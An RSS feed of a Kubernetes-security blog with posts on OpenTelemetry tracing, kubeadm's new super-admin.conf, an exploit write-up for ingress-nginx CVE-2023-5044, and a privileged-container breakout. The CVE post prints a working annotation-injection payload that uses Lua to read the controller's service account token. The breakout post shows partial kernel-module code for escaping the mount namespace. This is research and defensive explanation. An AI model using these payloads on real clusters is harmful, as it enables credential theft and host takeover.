<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
	<channel>
		<title>Raesene's Ramblings</title>
		<description>Things that occur to me</description>
		<link>https://raesene.github.io/</link>
		<atom:link href="https://raesene.github.io/feed.xml" rel="self" type="application/rss+xml" />
		
			<item>
				<title>Adding Open Telemetry to Container Stacks</title>
				<description>&lt;p&gt;This year, I’ve started looking at how &lt;a href=&quot;https://www.linkedin.com/pulse/security-observability-match-made-heaven-rory-mccune-mej4e%3FtrackingId=MrZn6Pw%252FpmXQjCGKT1hxKA%253D%253D/?trackingId=MrZn6Pw%2FpmXQjCGKT1hxKA%3D%3D&quot;&gt;observability can work well for security&lt;/a&gt; and as part of that I’ve been investigating Open Telemetry, to understand more about how it works.&lt;/p&gt;

&lt;p&gt;So when I noticed in recent Kubernetes release notes that Open Telemetry support was being added, I decided to take a look at how it’s being integrated in k8s and other parts of container stacks.&lt;/p&gt;

&lt;p&gt;This blog is just some notes about how to get it set up, and some of the things I’ve noticed along the way.&lt;/p&gt;

&lt;h2 id=&quot;basic-architecture&quot;&gt;Basic Architecture&lt;/h2&gt;

&lt;p&gt;There’s essentially 3 elements to the architecture of a basic observability stack. We’ve got sources of Telemetry (e.g. logs, metrics, traces) which in this case will be services like Kubernetes and Docker, a collector to gather and process that telemetry, and then one or more backends to send the information to.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raesene.github.io/assets/media/container-otel-architecture.png&quot; alt=&quot;Basic OTel Architectuer&quot; /&gt;&lt;/p&gt;

&lt;p&gt;For the sources of telemetry in this case we’re going to rely on their OTel integrations, which are built into the software. The &lt;a href=&quot;https://opentelemetry.io/docs/collector/&quot;&gt;Open Telemetry Collector&lt;/a&gt; is our collector which will receive the data, process it and then forward to our backends. Then for backends to demonstrate having multiple ones setup, I used &lt;a href=&quot;https://www.jaegertracing.io/&quot;&gt;Jaeger&lt;/a&gt; and &lt;a href=&quot;https://www.datadoghq.com/&quot;&gt;Datadog&lt;/a&gt; (full disclosure, I work for Datadog :) ).&lt;/p&gt;

&lt;h2 id=&quot;setting-up-the-otel-support-in-kubernetes&quot;&gt;Setting up the OTel support in Kubernetes&lt;/h2&gt;

&lt;p&gt;To test this out in Kubernetes I’m going to make use of &lt;a href=&quot;https://kind.sigs.k8s.io/&quot;&gt;KinD&lt;/a&gt; to create a local cluster. A relatively recent version of Kubernetes is needed as the OTel support has only been added in the last few releases (alpha in 1.22, beta in 1.27). It’s not currently at release level so we need to give the API server a feature flag to enable it. If you want some more background on how tracing is being added to Kubernetes, it’s worth reading the &lt;a href=&quot;https://github.com/kubernetes/enhancements/tree/master/keps/sig-instrumentation/647-apiserver-tracing&quot;&gt;KEP&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;This is the KinD configuration I used to create the cluster. In addition to the feature flag, we need a mount to provide the configuration file to the API server.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-YAML&quot;&gt;kind: Cluster
apiVersion: kind.x-k8s.io/v1alpha4
featureGates:
  &quot;APIServerTracing&quot;: true
nodes:
- role: control-plane
  extraMounts:
  - hostPath: /home/rorym/otel
    containerPath: /otel
    propagation: None
  kubeadmConfigPatches:
  - |
    kind: ClusterConfiguration
    apiServer:
      extraArgs:
        tracing-config-file: &quot;/otel/config.yaml&quot;
      extraVolumes:
        - name: &quot;otel&quot;
          hostPath: &quot;/otel&quot;
          mountPath: &quot;/otel&quot;
          readOnly: false
          pathType: &quot;Directory&quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tracing-config-file&lt;/code&gt; is the key part here, it’s telling the API server where to find the configuration file for the OTel support. The sample file I created looks like this.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-YAML&quot;&gt;apiVersion: apiserver.config.k8s.io/v1beta1
kind: TracingConfiguration
endpoint: 192.168.41.107:4317
samplingRatePerMillion: 1000000
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;There’s a couple of important settings here. The first one is the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;endpoint&lt;/code&gt; which is the address of the OTel collector. The second is the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;samplingRatePerMillion&lt;/code&gt; which is the rate at which to sample traces. In this case I’m sampling 100% of traces, but in a real-world scenario you’d want to sample a smaller percentage to avoid overwhelming your backend.&lt;/p&gt;

&lt;h2 id=&quot;setting-up-the-otel-collector&quot;&gt;Setting up the OTel Collector&lt;/h2&gt;

&lt;p&gt;Next step is to setup the OTel collector to receive the traces from the cluster. We need a configuration file for the collector, which looks like this.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-YAML&quot;&gt;receivers:
  otlp: # the OTLP receiver the app is sending traces to
    protocols:
      grpc:
        endpoint: 0.0.0.0:4317
      http:
        endpoint: 0.0.0.0:4318
processors:
  batch:

exporters:
  otlp/jaeger: # Jaeger supports OTLP directly
    endpoint: 192.168.41.107:44317
    tls:
      insecure: true
  datadog:
    api:
      key: &quot;API_KEY_HERE&quot;

service:
  pipelines:
    traces/dev:
      receivers: [otlp]
      processors: [batch]
      exporters: [otlp/jaeger, datadog]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;receivers&lt;/code&gt; sections has the ports to listen on , with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;4317&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;4318&lt;/code&gt; being defaults. In this case we’re deploying the collector on a different host to the cluster, so we’ll listen on all interfaces.&lt;/p&gt;

&lt;p&gt;Next up we define the exporters for the traces. In this case we’re going to forward traces to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jaeger&lt;/code&gt; on a non-standard port (44317) and to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;datadog&lt;/code&gt;. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;datadog&lt;/code&gt; exporter needs an API key to be able to send the traces to the backend.&lt;/p&gt;

&lt;p&gt;Finally we define a pipeline to process the traces. In this case we’re going to process all traces and send them to both &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jaeger&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;datadog&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;To run the collector we can then just use this docker command&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker run &lt;span class=&quot;nt&quot;&gt;--rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--name&lt;/span&gt; collector &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;pwd&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;/config.yaml:/etc/otelcol-contrib/config.yaml &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 4317:4317 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 4318:4318 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 55679:55679 otel/opentelemetry-collector-contrib:0.93.0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;setting-up-jaeger&quot;&gt;Setting up Jaeger&lt;/h2&gt;

&lt;p&gt;For demo purpose we can just run Jaeger using Docker. The command to run it is&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker run &lt;span class=&quot;nt&quot;&gt;--rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;COLLECTOR_ZIPKIN_HOST_PORT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;:9411 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 16686:16686 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 44317:4317 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 44318:4318 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 49411:9411 jaegertracing/all-in-one:latest
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As I’m running both containers on the same host, I’m using non-standard ports to avoid conflicts.&lt;/p&gt;

&lt;h2 id=&quot;viewing-traces&quot;&gt;Viewing Traces&lt;/h2&gt;

&lt;p&gt;Now we’ve got the cluster up and running and our OTel collector and backends setup, we can start to see traces. This is a screenshot of how the traces look in Datadog.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raesene.github.io/assets/media/datadog-k8s-trace-list.png&quot; alt=&quot;Datadog trace list&quot; /&gt;&lt;/p&gt;

&lt;p&gt;There’s quite a bit of information in these traces, showing the internal operations of the cluster. We can see the schedulers and controller manager making requests to the API server as well as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kube-probe&lt;/code&gt; checking the health of the API server.&lt;/p&gt;

&lt;p&gt;From a security standpoint, whilst this is no replacement for audit logging, there is some interesting data there, although in production it’s worth remembering that traces would likely be sampled and not 100% of them would be sent to the backend.&lt;/p&gt;

&lt;h2 id=&quot;setting-up-docker-with-otel&quot;&gt;Setting up Docker with OTel&lt;/h2&gt;

&lt;p&gt;There’s also support for tracing in Docker, which is enabled by adding environment variables to the service. If you’ve got Docker running under systemd, you can edit the service file to add the environment variables.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;systemctl edit docker.service
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And then add the environment variables to the service file (replace 192.168.41.107 with the IP of your collector)&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Service]
&lt;span class=&quot;nv&quot;&gt;Environment&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;OTEL_EXPORTER_OTLP_ENDPOINT=http://192.168.41.107:4318&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After that you can do a daemon-reload and then restart the service and you’ll get traces showing up in your backend(s).&lt;/p&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;As Open Telemetry uptake increases, it’s likely that many services that we use will get support for it, enabling a standardized approach to observability instrumentation to be established. From a security standpoint, this has quite a bit of promise for improving our access to security information generated by applications, so it’ll be interesting to see how it develops.&lt;/p&gt;
</description>
				<pubDate>Sat, 10 Feb 2024 09:27:00 +0000</pubDate>
				<link>https://raesene.github.io/blog/2024/02/10/adding-open-telemetry-to-container-stacks/</link>
				<guid isPermaLink="true">https://raesene.github.io/blog/2024/02/10/adding-open-telemetry-to-container-stacks/</guid>
			</item>
		
			<item>
				<title>When is admin not admin?, when it's super-admin!</title>
				<description>&lt;p&gt;I came across an interesting change in how Kubeadm based clusters handle initial credential setup in Kubernetes 1.29 and later, so thought it was worth a quick post. &lt;a href=&quot;https://twitter.com/smarticu5&quot;&gt;Smarticu5&lt;/a&gt; had a really unusual error, which was that on a newly created Kubeadm cluster he was getting a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;forbidden&lt;/code&gt; error when using the default &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin.conf&lt;/code&gt; credential created by Kubeadm.&lt;/p&gt;

&lt;p&gt;This specific error &lt;em&gt;shouldn’t&lt;/em&gt; be possible, as traditionally &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin.conf&lt;/code&gt; is a member of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system:masters&lt;/code&gt; group which bypasses RBAC checks and always gets full cluster-admin level access to everything, so if a valid credential is presented, it should always work.&lt;/p&gt;

&lt;p&gt;Interest piqued, we took a bit of a closer look at what was happening. First up was to decode the client certificate on the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin.conf&lt;/code&gt; file to see what usernames and groups it was associated with (If you’re ever looking to do this and can’t remember the exact commands, I’d recommend using &lt;a href=&quot;https://gchq.github.io/CyberChef/&quot;&gt;Cyber Chef&lt;/a&gt; which can base64 decode, and decode X.509 certs).&lt;/p&gt;

&lt;p&gt;The output we got back was this:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  CN &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; kubernetes
Subject
  O  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; kubeadm:cluster-admins
  CN &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; kubernetes-admin
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Sooo this credential was no longer a member of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system:masters&lt;/code&gt;, interesting! Next step, as is often the case when spelunking around in Kubernetes was to go look at Github to see if any recent changes had been made to how things work. Sure enough, there was a &lt;a href=&quot;https://github.com/kubernetes/kubernetes/pull/121305&quot;&gt;PR&lt;/a&gt; which explained how Kubeadm now has two files with initial credentials, the original &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin.conf&lt;/code&gt; and a new &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;super-admin.conf&lt;/code&gt;. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin.conf&lt;/code&gt; has been changeed to use an RBAC group for access, which should give it &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cluster-admin&lt;/code&gt; rights, but in a way that they could be revoked by removing the rights of that group, and then have the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;super-admin.conf&lt;/code&gt; file still be a member of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system:masters&lt;/code&gt; whose rights can’t be revoked by modifying RBAC.&lt;/p&gt;

&lt;p&gt;Digging back from this PR, to the referenced issue to get some back-story, I got a slight surprise to find it was &lt;a href=&quot;https://github.com/kubernetes/kubeadm/issues/2414&quot;&gt;one I’d opened&lt;/a&gt; back in 2021 about not using system:masters!&lt;/p&gt;

&lt;h2 id=&quot;what-does-this-mean&quot;&gt;What does this mean?&lt;/h2&gt;

&lt;p&gt;There’s a couple of practical consequences to consider with this change.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;If you’re tracking permissions on sensitive files, and access to them, where you’re using a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kubeadm&lt;/code&gt; based Kubernetes distribution, you will need to update your tracking to include the new &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;super-admin.conf&lt;/code&gt; file.&lt;/li&gt;
  &lt;li&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;super-admin.conf&lt;/code&gt; file should &lt;em&gt;not&lt;/em&gt; be used for any administrative tasks, instead place it somewhere safe and only use it if RBAC gets completely messed up. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin.conf&lt;/code&gt; isn’t ideal either as it’s a generic account, but at least its permissions can be revoked now!&lt;/li&gt;
  &lt;li&gt;It is now possible to see a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;forbidden&lt;/code&gt; error when using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin.conf&lt;/code&gt; if RBAC isn’t fully configured, or if the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;clusterrolebinding&lt;/code&gt; for the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kubeadm:cluster-admins&lt;/code&gt; group has been changed.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;Another example of why it’s important to keep up to date with changes in Kubernetes, and to understand how your cluster is configured. This change is a good one, as it makes it easier to revoke the rights of the initial credential, but it’s important to understand how it works, and how it might impact your cluster.&lt;/p&gt;
</description>
				<pubDate>Sat, 06 Jan 2024 09:27:00 +0000</pubDate>
				<link>https://raesene.github.io/blog/2024/01/06/when-is-admin-not-admin/</link>
				<guid isPermaLink="true">https://raesene.github.io/blog/2024/01/06/when-is-admin-not-admin/</guid>
			</item>
		
			<item>
				<title>Exploiting CVE-2023-5044</title>
				<description>&lt;p&gt;Recently several new CVEs in the ingress nginx controller for Kubernetes were announced. I thought I’d take a closer look at one of them, CVE-2023-5044. Whilst there’s some details in the &lt;a href=&quot;https://github.com/kubernetes/ingress-nginx/issues/10572&quot;&gt;CVE announcement&lt;/a&gt; and some hints in a post from the CVE reporter &lt;a href=&quot;https://www.linkedin.com/posts/jkroepke_kubernetes-cve-2023-5044-code-injection-activity-7123677225765228545-93MI?trk=public_profile_share_view&quot;&gt;here&lt;/a&gt; there’s not any actual PoC that I could find, so I decided to see if I could write one!&lt;/p&gt;

&lt;h2 id=&quot;test-environment-setup&quot;&gt;Test environment setup&lt;/h2&gt;

&lt;p&gt;As is often the case, the easiest way to set up a test environment was to use &lt;a href=&quot;https://kind.sigs.k8s.io/&quot;&gt;KinD&lt;/a&gt;. They have a page with instructions for ingress setups &lt;a href=&quot;https://kind.sigs.k8s.io/docs/user/ingress/&quot;&gt;here&lt;/a&gt; which works well.&lt;/p&gt;

&lt;p&gt;Once we have ingress setup with the sample applications provided curl’ing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://localhost/foo&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://localhost/bar&lt;/code&gt; will hit paths managed by the ingress controller.&lt;/p&gt;

&lt;h2 id=&quot;experimenting-with-the-vulnerability&quot;&gt;Experimenting with the vulnerability&lt;/h2&gt;

&lt;p&gt;So we know from the advisory that the problem lies in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nginx.ingress.kubernetes.io/permanent-redirect&lt;/code&gt; annotation, so one of the first things I thought to try was classic command injection where you end the statement that’s being provided and start a new directive. In the case of nginx this uses the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;;&lt;/code&gt; character, so I tried that and it seemed to work!&lt;/p&gt;

&lt;p&gt;Exec’ing into the ingress controller pod, I could see that what happens with this annotation is that anything you provide is basically injected directly into the nginx config file used by the controller.&lt;/p&gt;

&lt;p&gt;One option I experimented with, as it seems like a good way to get access to sensitive files (like the service account token for the controller which has high privileges to the cluster) would be to use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;alias&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; directives to serve up the file. However these directives have &lt;a href=&quot;https://github.com/kubernetes/ingress-nginx/pull/8624&quot;&gt;been disabled&lt;/a&gt; so that wasn’t going to work.&lt;/p&gt;

&lt;p&gt;Fortunately I remembered that lua scripting is sometimes supported in nginx, so we might be able to use that. With a bit of help from ChatGPT on the exact syntax of what to use, I was able to get a working PoC.&lt;/p&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;na&quot;&gt;nginx.ingress.kubernetes.io/permanent-redirect&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;https://www.mccune.org.uk;}location ~* &quot;^/flibble(/|$)(.*)&quot; {content_by_lua 'ngx.say(io.popen(&quot;cat /var/run/secrets/kubernetes.io/serviceaccount/token&quot;):read(&quot;*a&quot;))';}location ~* &quot;^/flibblea(/|$)(.*)&quot; { content_by_lua 'os.execute(&quot;touch /you&quot;)'&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This could definitely be neater, but what it does is close off the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;location&lt;/code&gt; directive with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;;}&lt;/code&gt; after the URL that we’re redirecting to. Then open a new &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;location&lt;/code&gt; on the path &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/flibble&lt;/code&gt;. When someone calls that path we run a lua script that uses &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;io.popen&lt;/code&gt; to run an OS command and then returns that to the caller using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nginx.say&lt;/code&gt;. After that I just put another location directive to absorb any unwanted directives that were already in the file (it’s important that you balance up the braces in the file, otherwise your change will get rejected).&lt;/p&gt;

&lt;p&gt;With that in place you can curl &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;localhost/flibble&lt;/code&gt; and get back the service account token for the ingress which has high privileges to the cluster, notably GET secrets at the cluster level.&lt;/p&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;This is an interesting vulnerability and one that (despite being a bit fiddly) wasn’t too difficult to exploit. In terms of risk however, it’s quite situational as it requires rights to edit &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ingress&lt;/code&gt; objects in a namespace, so it’s not something an attacker outside the cluster is likely to be able to execute.&lt;/p&gt;
</description>
				<pubDate>Sun, 29 Oct 2023 09:27:00 +0000</pubDate>
				<link>https://raesene.github.io/blog/2023/10/29/exploiting-CVE-2023-5044/</link>
				<guid isPermaLink="true">https://raesene.github.io/blog/2023/10/29/exploiting-CVE-2023-5044/</guid>
			</item>
		
			<item>
				<title>Fun with privileged container breakout</title>
				<description>&lt;p&gt;One of the truisms of container security is that when a container is run as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;privileged&lt;/code&gt; (in the sense of the Docker flag, not just running as the root user) it’s insecure and possible to break out. However, there aren’t always great examples of how to break out of a privileged container in practice.&lt;/p&gt;

&lt;p&gt;For containers with cgroupsv1 there was Felix Wilhelm’s great &lt;a href=&quot;https://twitter.com/_fel1x/status/1151487051986087936?s=20&quot;&gt;breakout in a tweet&lt;/a&gt;, but as more systems move to cgroupsv2, that one becomes less useful.&lt;/p&gt;

&lt;p&gt;There’s also techniques based on adding entries to SSH trusted credentials and then SSH’ing to the host, but those are a little situational and need the container to be able to SSH to the host, which may not always be the case.&lt;/p&gt;

&lt;p&gt;So I was on the hunt for something a bit more generally applicable that works with any setup, when I came across &lt;a href=&quot;https://pulsesecurity.co.nz/articles/docker-rootkits&quot;&gt;this post&lt;/a&gt; from Denis Andzakovic of Pulse Security, which had multiple examples of ways breaking out, so I thought it’d be interesting to explore one of these and see how well it works. Please note the clever parts of this post are all from Denis, I’m just exploring them in a bit more detail :)&lt;/p&gt;

&lt;h2 id=&quot;the-setup&quot;&gt;The setup&lt;/h2&gt;

&lt;p&gt;One of the things you can do in a privileged container is load new kernel modules, and kernel modules have rights that can be used for container breakout, so we should be able to use one of these to break out.&lt;/p&gt;

&lt;p&gt;Looking at the examples in the Pulse blog, there’s one that allows for rewriting cred and fs structs essentially breakout out of the &lt;a href=&quot;https://securitylabs.datadoghq.com/articles/container-security-fundamentals-part-2/#mount-namespace&quot;&gt;mount namespace&lt;/a&gt; which, as you’ll see leads directly to full container breakout.&lt;/p&gt;

&lt;h2 id=&quot;the-kernel-module-code&quot;&gt;The Kernel module code&lt;/h2&gt;

&lt;p&gt;The code provided in the Pulse blog doesn’t work on modern Linux kernels, due to a change in function signature, but with a little help from ChatGPT, it was possible to get a version which works fine on the Linux 5.15 kernel in Ubuntu 22.04. In this case I’ve called the source code &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;legit2.c&lt;/code&gt;. This code will essentially cause a process to get the mount namespace of the host when triggered by writing to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/proc/legit&lt;/code&gt; in the container.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;linux/module.h&amp;gt;
#include &amp;lt;linux/kernel.h&amp;gt;
#include &amp;lt;linux/cred.h&amp;gt;
#include &amp;lt;linux/fs_struct.h&amp;gt;
#include &amp;lt;linux/sched/task.h&amp;gt;
#include &amp;lt;linux/proc_fs.h&amp;gt;
&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;tweak_fs_struct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fs_struct&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fs_struct&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;dest&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;users&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;dest&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;in_exec&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;dest&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;umask&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;umask&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

        &lt;span class=&quot;n&quot;&gt;dest&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;dest&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pwd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pwd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

